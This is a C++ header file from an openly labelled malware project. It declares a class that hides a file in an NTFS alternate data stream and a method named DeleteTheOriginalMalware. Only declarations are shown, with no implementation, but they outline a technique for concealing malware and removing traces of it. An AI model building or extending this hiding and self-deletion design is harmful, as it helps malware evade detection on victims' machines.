/*
##################################################
#                                                #
#         Malware Coder: Elliot Alderson         #
#                                                #
#   Github: https://github.com/ElliotAlderson51  #
#                                                #
##################################################
*/

#ifndef ADS_H
#define ADS_H

#include "Tools.h"

#define ADS_ALREADY_EXISTS 3


class ADS : Tools
{
	std::string currentUserDir;
	BOOL CreateADS(const std::string& source_path, const std::string& destination_path, const std::string& stream_name);

public:

	ADS();
	BOOL DeleteTheOriginalMalware();

};

#endif // !ADS_H
